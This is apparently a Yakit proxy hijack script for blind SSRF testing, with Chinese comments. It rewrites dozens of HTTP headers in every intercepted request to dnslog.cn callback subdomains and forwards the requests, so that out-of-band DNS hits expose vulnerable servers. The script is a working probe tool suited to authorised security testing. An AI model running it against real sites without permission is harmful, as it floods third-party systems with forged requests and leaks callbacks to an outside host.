// 修改dnslog域名
dnslogDomain = "www.dnslog.cn"

// 黑名单，协议控制header，不修改
var headersBlacklist = {
    "Connection":                true,
    "Content-Length":            true, 
    "Content-Encoding":          true,
    "Content-Type":              true,
    "Content-Transfer-Encoding": true,
    "Expect":                    true,
    "TE":                        true,
    "Trailer":                   true,
    "Transfer-Encoding":         true,
    "Upgrade":                   true,
    "Host":                      true, 
    "Accept":                    true,
    "Accept-Charset":            true,
    "Accept-Encoding":           true,
    "Accept-Language":           true,
    "Authorization":             true,
    "Proxy-Authorization":       true,
    "Date":                      true,
    "ETag":                      true,
    "If-Match":                  true,
    "If-None-Match":             true,
    "If-Modified-Since":         true,
    "If-Unmodified-Since":       true,
    "If-Range":                  true,
    "Pragma":                    true,
    "Range":                     true,
}

// header字典，https://github.com/z1sec/Testing/blob/main/headers.txt
var targetHeaders = [
    "Cache-Control", "Connection", "Date", "Pragma", "Trailer", "Transfer-Encoding",
    "Upgrade", "Via", "Warning", "Accept", "Accept-Charset", "Accept-Encoding",
    "Accept-Language", "Authorization", "Expect", "From", "If-Match",
    "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since",
    "Max-Forwards", "Proxy-Authorization", "Range", "Referer", "TE", "User-Agent",
    "Access-Control-Allow-Origin", "Access-Control-Allow-Methods", 
    "Access-Control-Allow-Headers", "Access-Control-Expose-Headers",
    "Access-Control-Max-Age", "Access-Control-Allow-Credentials",
    "Access-control-request-method", "Access-control-request-headers",
    "Content-Type", "Content-Length", "Content-Encoding", "Content-Language",
    "Content-Location", "Content-MD5", "Content-Range", "Content-Disposition",
    "Content-Transfer-Encoding", "Content-Security-Policy",
    "Content-Security-Policy-Report-Only", "Content-Type-Options",
    "Content-Base", "Content-Description", "Content-ID", "Content-Features",
    "Content-Profile", "Content-Variant", "Content-Hash", "Content-Checksum",
    "Accept-Ranges", "Age", "ETag", "Location", "Proxy-Authenticate",
    "Retry-After", "Server", "Vary", "WWW-Authenticate", "Allow", "Expires",
    "Last-Modified", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
    "X-Requested-With", "X-CSRF-Token", "X-Content-Type-Options", "X-Frame-Options",
    "X-XSS-Protection", "DNT", "X-Powered-By", "X-UA-Compatible", "X-Request-ID",
    "X-RateLimit-Limit", "X-RateLimit-Remaining", "X-RateLimit-Reset",
    "X-Content-Duration", "X-WebKit-CSP", "X-Content-Security-Policy",
    "X-Download-Options", "X-Permitted-Cross-Domain-Policies", "X-Robots-Tag",
    "X-DNS-Prefetch-Control", "X-Accel-Buffering", "X-Accel-Charset",
    "X-Accel-Limit-Rate", "X-Accel-Redirect", "X-Amz-Cf-Id", "X-Amz-Cf-Pop",
    "CloudFront-Viewer-Counter", "App", "Base", "Deflate-Strategy-Def",
    "X-GitHub-Request-Id",
]

hijackHTTPRequest = func(isHttps, url, req, forward, drop) {
    try {
        urlInfo, err = str.ExtractURLFromHTTPRequestRaw(req, isHttps)
        if err != nil {
            panic(sprintf("无法从请求中解析URL: %v", err))
        }

        modifiedReq = req

        // 遍历所有目标header
        for _, headerName := range targetHeaders {
            if headersBlacklist[headerName] {
                log.warn("跳过黑名单中的Header: %s", headerName)
                continue
            }

            // 创建带前缀的dnslog地址
            headerPrefix = str.ToLower(headerName).Replace("-", "").Replace("_", "")
            dnslogUrl = sprintf("%s.%s", headerPrefix, dnslogDomain)

            // 替换或添加header
            modifiedReq = poc.ReplaceHTTPPacketHeader(modifiedReq, headerName, dnslogUrl)
            log.info("已将请求头 %s 修改为 %s，目标地址：%s", headerName, dnslogUrl, urlInfo.String())
        }

        // 转发修改后的请求
        forward(modifiedReq)

    } catch err {
        log.error("盲 SSRF 请求头 fuzz 测试时出错：%v", err)
        forward(req)
    }
}
